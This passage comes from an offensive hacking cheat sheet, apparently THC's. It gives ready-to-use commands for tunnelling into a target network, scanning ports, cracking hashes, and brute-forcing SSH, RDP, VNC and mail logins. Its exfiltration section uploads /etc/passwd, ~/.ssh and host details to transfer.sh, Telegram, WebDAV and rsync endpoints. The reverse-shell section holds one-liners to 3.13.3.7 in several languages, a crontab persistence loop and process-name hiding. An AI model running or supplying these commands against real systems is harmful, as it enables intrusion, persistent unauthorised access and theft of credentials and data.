### On YOUR workstation:
cloudflared tunnel run --token TunnelTokenHere
```

```shell
### On the TARGET, create a reverse-SOCKS connection with SSH over Cloudflare:
ssh -o ProxyCommand="cloudflared access tcp --hostname ssh.team-teso.net" root@0 -R 1080
```

```shell
### On your workstation, connect to _any_ host within the target network (example: ipinfo.io)
curl -x socks5h://0 https://ipinfo.io
```
Use [ProxyChains or GrafTCP to tunnel](#scan-proxy) other protocols via the reverse proxy.


---
<a id="scan-proxy"></a>
**3.iv. Use any tool via Socks Proxy**

### Create a tunnel from the target to your workstation using gsocket:
On the target's network:
```sh
## Create a SOCKS proxy into the target's network.
## Use gs-netcat but ssh -D would work as well.
gs-netcat -l -S
```

On your workstation:
```sh
## Create a gsocket tunnel into the target's network:
gs-netcat -p 1080
```

### Using ProxyChain:
```sh
## Use ProxyChain to access any host on the target's network: 
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychains -f pc.conf -q curl ipinfo.io
## Scan the router at 192.168.1.1
proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
## Start 10 nmaps in parallel:
seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
```

### Using GrafTCP:
```sh
## Use graftcp to access any host on the target's network:
(graftcp-local -select_proxy_mode only_socks5 &)
graftcp curl ipinfo.io
graftcp ssh root@192.168.1.1
graftcp nmap -n -Pn -sV -F --open 19.168.1.1
```

---
<a id="your-ip"></a>
**3.v. Find your public IP address**

```sh
curl -s wtfismyip.com/json | jq
curl ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com
host myip.opendns.com resolver1.opendns.com
```

Get geolocation information about any IP address:

```sh
curl https://ipinfo.io/8.8.8.8 | jq
curl http://ip-api.com/8.8.8.8
curl https://cli.fyi/8.8.8.8
```

Get ASN information by IP address:

```sh
asn() {
  [[ -n $1 ]] && { echo -e "begin\nverbose\n${1}\nend"|netcat whois.cymru.com 43| tail -n +2; return; }
  (echo -e 'begin\nverbose';cat -;echo end)|netcat whois.cymru.com 43|tail -n +2
}
asn 1.1.1.1           # Single IP Lookup
cat IPS.txt | asn     # Bulk Lookup
```

Check if TOR is working:

```sh
curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip
### Result should be {"IsTor":true...
```

---
<a id="check-reachable"></a>
**3.vi. Check reachability from around the world**

The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.

To check how well your (current) host can reach Internet use [OONI Probe](https://ooni.org/support/ooni-probe-cli):
```sh
ooniprobe run im
ooniprobe run websites
ooniprobe list
ooniprobe list 1
```

---
<a id="check-open-ports"></a>
**3.vii. Check/Scan Open Ports on an IP**

[Censys](https://search.censys.io/) or [Shodan](https://internetdb.shodan.io) Port lookup service:
```shell
curl https://internetdb.shodan.io/1.1.1.1
```

Fast (-F) vulnerability scan
```shell
# Version gathering
nmap nmap -n -Pn -sCV -F --open --min-rate 10000 scanme.nmap.org
# Vulns
nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
```

Scan for open TCP ports:
```sh
_scan_single() {
    local opt=("${2}")
    [ -f "$2" ] && opt=("-iL" "$2")
    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
}
scan() {
    local port="${1:?}"
    shift 1
    for ip in "$@"; do
        _scan_single "$port" "$ip"
    done
}
# scan <ports> <IP or file> ...
# scan 22,80,443 192.168.0.1
# scan - 192.168.0.1-254" 10.0.0.1-254
```
(See [Hackshell](https://github.com/hackerschoice/hackshell) `scan`)

Simple bash port-scanner:
```shell
timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
```

---
<a id="bruteforce"></a>
**3.viii. Crack Password hashes**

 1. [NTLM2password](https://ntlm.pw/) to crack (lookup) NTLM passwords
 2. [wpa-sec](https://wpa-sec.stanev.org) to crack (lookup) WPA PSK passwords

HashCat is our go-to tool for everything else:
```shell
hashcat my-hash /usr/share/wordlists/rockyou.txt
```

Using a [10-days 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/) on GPU:
```sh
curl -fsSL https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask -o 10-days_7-16.hcmask
# -d2 == Use GPU #2 only (device #2)
# -O  == Up to 50% faster but limits password length to <= 15
# -w1 == workload low (-w3 == high)
nice -n 19 hashcat -o cracked.txt my-hash.txt -w1 -a3 10-days_7-16.hcmask -O -d2
```

Crack OpenSSH's `known_hosts` hashes to reveal the IP address:
```shell
curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/ipv4_hcmask.txt -O
curl -SsfL https://github.com/chris408/known_hosts-hashcat/raw/refs/heads/master/kh-converter.py -O
python3 kh-converter.py ~/.ssh/known_hosts >known_hosts_hashes
hashcat -m 160 --quiet --hex-salt known_hosts_hashes -a 3 ipv4_hcmask.txt 
```

👉 Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions).

Be aware that `$6$` hashes are SLOW. Even the [1-minute 7-16 char hashmask](https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/01%20instant_1-minute/1-minute_7-16.hcmask) would take many days on a 8xRTX4090 cluster to complete.

Rent a RTX-4090 GPU-Cluster at [vast.ai](https://www.vast.ai) for $0.40/h and use [dizcza/docker-hashcat:cuda](https://hub.docker.com/r/dizcza/docker-hashcat) ([read more](https://adamsvoboda.net/password-cracking-in-the-cloud-with-hashcat-vastai/)).

Otherwise, use [Crackstation](https://crackstation.net), [shuck.sh](https://shuck.sh/), [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or crack on your own [AWS](https://akimbocore.com/article/hashcracking-with-aws/) instances.

**3.xi. Brute Force Passwords / Keys**

The following is for brute forcing (guessing) passwords of ONLINE SERVICES.

<a id="gmail"></a>
<details>
  <summary>GMail Imbeciles - CLICK HERE</summary>

> You can not brute force GMAIL accounts.  
> SMTP AUTH/LOGIN IS DISABLED ON GMAIL.  
> All GMail Brute Force and Password Cracking tools are FAKE.
</details>

All tools are pre-installed on segfault:
```shell
ssh root@segfaul.net # password is 'segfault'
```
(You may want to use your [own EXIT node](https://www.thc.org/segfault/wireguard))

Tools:
* [Ncrack](https://nmap.org/ncrack/man.html)
* [Nmap BRUTE](https://nmap.org/nsedoc/categories/brute.html)
* [THC Hydra](https://sectools.org/tool/hydra/)
* [Medusa](https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/) / [docs](http://foofus.net/goons/jmk/medusa/medusa.html)
* [Metasploit](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
* [Crowbar](https://github.com/galkan/crowbar) - great for trying all ssh keys on a target IP range.

Username & Password lists:
* `/usr/share/nmap/nselib/data`  
* `/usr/share/wordlists/seclists/Passwords`
* https://github.com/berzerk0/Probable-Wordlists - >THC's FAVORITE<
* https://github.com/danielmiessler/SecLists  
* https://wordlists.assetnote.io  
* https://weakpass.com  
* https://crackstation.net/  


Set **U**sername/**P**assword list and **T**arget host.
```shell
ULIST="/usr/share/wordlists/brutespray/mysql/user"
PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
T="192.168.0.1"
```

Useful **Nmap** parameters:
```shell
--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly
```

Useful **Ncrack** parameters:
```shell
-U "${ULIST}"
-P "${PLIST}"
```

Useful **Hydra** parameters:
```shell
-t4      # Limit to 4 tasks
-l root  # Set username
-V       # Show each login/password attempt
-s 31337 # Set port
-S       # Use SSL
-f       # Exit after first valid login
```

<!--
```shell
## HTTP Login
hydra -l admin -P "${PLIST}" http-post-fomr "/admin.php:u=^USER&p-^PASS&f=login:'Enter'" -v
```
-->
```shell
## SSH
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"
```

```shell
## Remote Desktop Protocol / RDP
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"
```

```shell
## FTP
hydra -P "${PLIST}" -l user "ftp://$T"
```

```shell
## IMAP (email)
nmap -p 143,993 --script imap-brute "$T"
```

```shell
## POP3 (email)
nmap -p110,995 --script pop3-brute "$T"
```

```shell
## MySQL
nmap -p3306 --script mysql-brute "$T"
```

```shell
## PostgreSQL
nmap -p5432 --script pgsql-brute "$T"
```

```shell
## SMB (windows)
nmap --script smb-brute "$T"
```

```shell
## Telnet
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
```

```shell
## VNC
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"
```

```shell
## VNC (with metasploit)
msfconsole
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.0.1
set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
run
```

```shell
## HTML basic auth
echo admin >user.txt                     # Try only 1 username
echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
nmap -p80 --script http-brute --script-args \
   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
   pentesteracademylab.appspot.com
```

---
<a id="exfil"></a>
## 4. Data Upload/Download/Exfil

Easiest: Type `exfil` on a [Segfault Root Server](https://thc.org/segfault)

Or use curl and run your own [PHP exfil server](https://github.com/Rouji/single_php_filehost).

<a id="file-encoding"></a>

### 4.i File Encoding

Trick to transfer a file to the target when the target does not have access to the Internet: Convert the binary file into ASCII-text (base64) and then use cut & paste. (Alternatively use gs-netcat's elite console with `Ctrl-e c` to transfer file over the same TCP connection.)

Use `xclip` (on your workstation) to pipe the encoded data straight into your clipboard:
```shell
base64 -w0 </etc/issue.net | xclip
```



#### >>> UU encode/decode

```sh
## uuencode 
uuencode /etc/issue.net issue.net-COPY
```
<details>
  <summary>Output - CLICK HERE</summary>

> begin 644 issue.net-COPY  
> 72V%L:2!'3E4O3&EN=7@@4F]L;&EN9PH\`  
> `  
> end
</details>

```sh
## uudecode (cut & paste the 3 lines from above):
uudecode
```
#### >>> base64 encode/decode

```sh
base64 -w0 </etc/issue.net 
```
<details>
  <summary>Output - CLICK HERE</summary>

> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
</details>

```sh
base64 -d >issue.net-COPY
```

#### >>> Openssl encode/decode

```sh
openssl base64 </etc/issue.net 
```
<details>
  <summary>Output - CLICK HERE</summary>

> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
</details>

```sh
openssl base64 -d >issue.net-COPY
```

#### >>> xxd encode/decode

```sh
xxd -p </etc/issue.net
```
<details>
  <summary>Output - CLICK HERE</summary>

> 4b616c6920474e552f4c696e757820526f6c6c696e670a
</details>

```sh
xxd -p -r >issue.net-COPY
```

---
<a id="cut-paste"></a>
### 4.ii. File transfer - using cut & paste

Paste into a file on the remote machine (note the `<<-'__EOF__'` to not mess with tabs or $-variables).
```sh
cat >output.txt <<-'__EOF__'
[...]
__EOF__  ### Finish your cut & paste by typing __EOF__
```

---
<a id="xfer-tmux"></a>
### 4.iii. File transfer - using *tmux*

Start `tmux` on your workstation. Connect to your target by any means you like (ssh, gs-netcat, ...).

#### From REMOTE to LOCAL (download)

Use [Tmux-Logging](#tmux) to download large files from the target via the terminal to your workstation.

#### From LOCAL to REMOTE (upload)

Start your favorite decoding tool (base64) on the REMOTE:
```shell
# Use 'Ctrl-b $' to rename this tmux session to 'foo'
base64 -d >screen-xfer.txt
```

On your workstation, and from a different terminal, send base64-encoded data. It will arrive on your REMOTE in `screen-xfer.txt`.
```shell
tmux send-keys -t foo "$(base64 -w64 </etc/issue.net)"$'\n'
# Press 'Ctrl-d' in the receiving terminal.
# Optional: Use -t foo:1.2 to send to window #1 and pane #2 instead.
# Optional: Use 'Ctrl-b ,' to rename the window
```

---
<a id="file-transfer-screen"></a>
### 4.vi. File transfer - using *screen*

#### From REMOTE to LOCAL (download)

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```sh
## On the remote system encode issue.net
openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer decode the file:
```sh
openssl base64 -d <screen-xfer.txt
rm -rf screen-xfer.txt
```

#### From LOCAL to REMOTE (upload)

On your local system encode the data:
```sh
openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```sh
openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

---
<a id="file-transfer-gs-netcat"></a>
### 4.v. File transfer - using gs-netcat and sftp

Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.

```sh
gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall
```

From your workstation execute this command to connect to the SFTP server:
```sh
export GSOCKET_ARGS="-s MySecret"                        # Workstation
sftp -D gs-netcat                                        # Workstation
```

Or to DUMP a single file:
```sh
# On the sender
gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver

# On the receiver
gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
```

---
<a id="http"></a>
### 4.vi. File transfer - using HTTPs

#### Download from Server to Receiver:

On the Sender/Server:
```sh
## Spawn a temporary HTTP server and share the current working directory.
python -m http.server 8080 --bind 127.0.0.1 &
# alternative: php -S 127.0.0.1:8080
cloudflared tunnel -url localhost:8080
```
Receiver: Access the URL from any browser to view/download the remote file system.

#### 1 - Upload using PHP:

On the Receiver:
```posh
curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
mkdir upload
(cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
cloudflared tunnel --url localhost:8080 --no-autoupdate
```

On the Sender:
```posh
# Set a function:
up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
# upload files like so:
up warez.tar.gz
up /etc/passwd
```

#### 2 - Upload using PYTHON:

On the Receiver:
```posh
pip install uploadserver
python -m uploadserver &
cloudflared tunnel -url localhost:8000
```

On the Sender:
```posh
curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
```

---
<a id="download"></a>
### 4.vii. File download without curl

Using Python, download only:
```sh
# Declare a curl-alternative
purl() {
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    "$(which python3 || which python || which python2 || which false)" -c "\
import urllib.request
import sys
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx).read())"
}
# purl ipinfo.io
```

Example: Installing gsocket with purl:
```sh
# cut & paste the above purl() function into your bash. Then cut & paste the following:
source <(purl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh) \
&& bin curl \
&& bash -c "$(curl -fsSL https://gsocket.io/y)" \
&& xdestruct
```

Using OpenSSL, download only:
```sh
surl() {
    local r="${1#*://}"
    local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
	| openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
	| sed '1,/^\r\{0,1\}$/d'
}
# surl ipinfo.io
```

using Perl, download only:
```sh
lurl() {
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    perl -e 'use LWP::Simple qw(get);
my $url = '"'${1:?}'"';
print(get $url);'
}
# lurl ipinfo.io
```

Using bash, download only:
```sh
burl() {
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
```

---
<a id="trans"></a>
### 4.viii. File transfer using a public dump

Cut & paste into your bash:
```sh
transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
}
```

then upload a file or a directory:
```sh
transfer /etc/passwd  # A single file
transfer ~/.ssh       # An entire directory
(curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
```
A list of our [favorite public upload sites](#cloudexfil).

---
<a id="rsync"></a>
### 4.ix. File transfer - using rsync

Ideal for synchronizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.

Receiver:
```posh
echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
mkdir upload
rsync --daemon --port=31337 --config=r.conf --no-detach
```

Sender:
```posh
rsync -av warez rsync://1.2.3.4:31337/up
```

The same encrypted (OpenSSL):

Receiver:
```posh
# use rsa:2048 if ed25519 is not supported (e.g. rsync connection error)
openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
cat ssl.key ssl.crt >ssl.pem
rm -f ssl.key ssl.crt
mkdir upload
cat ssl.pem
socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
```

Sender:
```posh
# Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
IP=1.2.3.4
PORT=31337
# Using rsync + socat-ssl
up1() {
   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
}
# Using rsync + openssl
up2() {
   rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
}
up1 /var/www/./warez
up2 /var/www/./warez
```

Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
(To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).

Pro Tip: Lazy hackers just type `exfil` on segfault.net.

---
<a id="webdav"></a>
### 4.x. File transfer - using WebDAV

On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
```sh
cloudflared tunnel --url localhost:8080 &
# [...]
# +--------------------------------------------------------------------------------------------+
# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
# |  https://example-foo-bar-lights.trycloudflare.com                                          |
# +--------------------------------------------------------------------------------------------+
# [...]
wsgidav --port=8080 --root=.  --auth=anonymous
```

On another server:
```sh
# Upload a file to your workstation
curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
# Create a directory remotely
curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
# Create a directory hierarchy remotely
find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
# Upload all *.c files (in parallel):
find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
```

Access the share from Windows (to drag & drop files) in File Explorer:
```
\\example-foo-bar-lights.trycloudflare.com@SSL\sources
```

Or mount the WebDAV share on Windows (Z:/):
```
net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
```

---
<a id="tg"></a>
### 4.xi. File transfer to Telegram

There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
```sh
curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
# If you get only {"ok":true,"result":[]} then remove and add the bot again.
```

```sh
# Upload file.zip straight into the group chat:
curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
```

---
<a id="reverse-shell"></a>
## 5. Reverse Shell / Dumb Shell

Tip: Use [https://www.revshells.com/](https://www.revshells.com/) 👌

<a id="reverse-shell-gs-netcat"></a>
**5.i.a. Reverse shell with gs-netcat (encrypted)**

See [6. Backdoors](#backdoor) for a 1-liner to deploy and access a fully functioning PTY reverse shell using [https://gsocket.io/deploy](https://gsocket.io/deploy).

<a id="reverse-shell-bash"></a>
**5.i.b. Reverse shell with Bash**

Start netcat to listen on port 1524 on your system:
```sh
nc -nvlp 1524
```
After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
```sh
pwncat -lp 1524
# Press "Ctrl-C" if pwncat gets stuck at "registered new host ...".
# Then type "back" to get the prompt of the remote shell.
```

On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```sh
# If the current shell is Bash already:
(bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &) 
# If the current shell is NOT Bash then we need:
bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
# or hide the bash process as 'kqueue'
bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
```

Alternatively, on the remote system, put this into the `~/.profile` or crontab to re-start the connect-back shell (and also stiops multiple intances from being started):

```sh
fuser /dev/shm/.busy &>/dev/null || (bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &)
```

<a id="curlshell"></a>
**5.i.c. Reverse shell with cURL (encrypted)**

Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
```sh
# On YOUR workstation
# Generate SSL keys:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
# Start your listening server:
./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
```
```sh
# On the target:
curl -skfL https://3.13.3.7:8080 | bash
```

<a id="curltelnet"></a>
**5.i.d Reverse shell with cURL (cleartext)**

Start ncat to listen for multiple connections:
```sh
ncat -kltv 1524
```
```sh
# On the target:
C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
```

<a id="sslshell"></a>
**5.i.e. Reverse shell with OpenSSL (encrypted)**

```sh
# On YOUR workstation:
# Generate SSL keys:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
# Start your listening server:
openssl s_server -port 1524 -cert cert.pem -key key.pem
# Or pwncat:
# pwncat -lp 1524 --ssl
```

```sh
# On the target, start an openssl reverse shell as background process:
({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : & )
```

<a id="reverse-shell-no-bash"></a>
**5.i.f. Reverse shell without /dev/tcp**

Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:

```sh
nc -e /bin/sh -vn 3.13.3.7 1524
```

Variant if *'-e'* is not supported:
```sh
{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
```

* On modern shells this can be shortened to `{ nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
* The `| :` trick won't work on C-Shell/tcsh (FreeBSD), original Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.

Variant for older */bin/sh*:
```sh
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```sh
mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

Telnet variant when mkfifo is not supported (Ulg!):
```sh
touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
```
Note: Dont forget to `rm /tmp/.fio` after login.



<a id="revese-shell-remote-moe"></a>
**5.i.h. Reverse shell with remote.moe and ssh (encrypted)**

It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):

On your workstation:
```sh
# First Terminal - Create a remote.moe tunnel to your workstation
ssh-keygen -q -t rsa -N "" -f .r  # New key creates a new remote.moe-address
ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
# Note down the 'remote.moe' address which will look something like
# uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe

# Second Terminal - start listening for the reverse shell
nc -vnlp 8080
```

On the target(needs SSH and Bash):
```sh
bash -c '(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &>/dev/tcp/0/31338 0>&1 &)'
```

On the target (alternative; needs ssh, bash and mkfifo):
```sh
rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
```

<a id="reverse-shell-python"></a>
**5.i.i. Reverse shell with Python**
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<a id="reverse-shell-perl"></a>
**5.i.j. Reverse shell with Perl**

```sh
# method 1
perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
<a id="reverse-shell-php"></a>
**5.i.k. Reverse shell with PHP**

```sh
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

<a id="reverse-shell-upgrade"></a>
<a id="reverse-shell-pty"></a>
**5.ii.a. Upgrade a reverse shell to a PTY shell**

Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrade the shell to a real PTY shell:

```sh
# Using script
exec script -qc /bin/bash /dev/null  # Linux
exec script -q /dev/null /bin/bash   # BSD
```

```sh
# Using python
exec python -c 'import pty; pty.spawn("/bin/bash")'
```

<a id="reverse-shell-interactive"></a>
**5.ii.b. Upgrade a reverse shell to a fully interactive shell**

...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:

```sh
# On the target host spawn a PTY using any of the above examples:
python -c 'import pty; pty.spawn("/bin/bash")'
# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
```

```
# On your terminal execute:
stty raw -echo icrnl opost; fg
```

```sh
# On target host
export SHELL=/bin/bash
export TERM=xterm-256color
reset -I
